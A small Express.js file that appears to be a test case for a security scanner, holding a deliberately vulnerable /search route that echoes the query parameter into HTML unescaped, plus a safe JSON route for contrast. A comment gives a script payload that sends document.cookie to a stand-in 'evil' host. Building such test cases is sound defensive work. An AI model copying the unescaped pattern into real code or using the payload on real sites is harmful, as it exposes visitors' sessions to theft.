// Test snippet 4: reflected XSS.
//
// The previous version of this file passed a query parameter to res.render and
// put the actual injection in an EJS template quoted inside a comment. There
// was no template on disk, so there was nothing for an engine to scan and the
// case measured nothing. The injection is now in the JavaScript, where it can
// be found.
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
  const query = req.query.q;
  // VULNERABLE: user input concatenated into an HTML response with no escaping.
  // A query of `<script>fetch('//evil/'+document.cookie)</script>` runs in the
  // visitor's browser, on this origin.
  res.send('<h1>You searched for: ' + query + '</h1>');
});

// SAFE, for contrast: the value is sent as data, not as markup.
app.get('/search.json', (req, res) => {
  res.json({ query: req.query.q, results: [] });
});

module.exports = app;
